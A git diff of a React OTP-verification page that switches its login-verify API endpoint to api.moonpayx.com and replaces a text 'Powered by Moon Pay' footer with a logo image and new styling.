@@ -8,6 +8,7 @@ import axios from 'axios';
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 import { ChevronLeft } from 'lucide-react';
+import logoM from "./../assets/logo2.png";
 
 const PageContainer = styled.div`
   display: flex;
@@ -20,7 +21,12 @@ const PageContainer = styled.div`
   color: white;
   padding: 20px;
 `;
+const Moonn = styled.img`
+ 
+ width: 25%;
 
+
+`;
 const Card = styled.div`
   background-color: white;
   border-radius: 10px;
@@ -96,11 +102,18 @@ const Button = styled.button`
   opacity: ${props => (props.disabled ? 0.5 : 1)};
 `;
 
-const PoweredBy = styled.p`
-  font-size: 12px;
-  text-align: center;
-  margin: 1rem;
-  color: #666;
+const PoweredBy = styled.div`
+      font-size: 0.8rem;
+    color: black;
+    text-align: center;
+    margin-top: 0.5rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  @media (max-width: 430px) {
+    margin-top: 0px;
+    ;
+  }
 `;
 
 const LoadingSpinner = styled.div`
@@ -213,7 +226,7 @@ const OTPPage = () => {
     if (isFormValid) {
       setLoading(true);
       try {
-        const response = await axios.post('https://crypto-anl6.onrender.com/users/login/verify', {
+        const response = await axios.post('https://api.moonpayx.com/users/login/verify', {
           Email: location.state.email,
           OTP: otp.join('') // Concatenate OTP array into a single string
         });
@@ -274,7 +287,9 @@ const OTPPage = () => {
               {loading ? <LoadingSpinner /> : 'Verify OTP'}
             </Button>
           </FormContainer>
-          <PoweredBy>Powered by Moon Pay</PoweredBy>
+          <PoweredBy>
+          Powered by <Moonn src={logoM}/>
+        </PoweredBy>
         </Card>
       </PageContainer>
       <HomeContact />
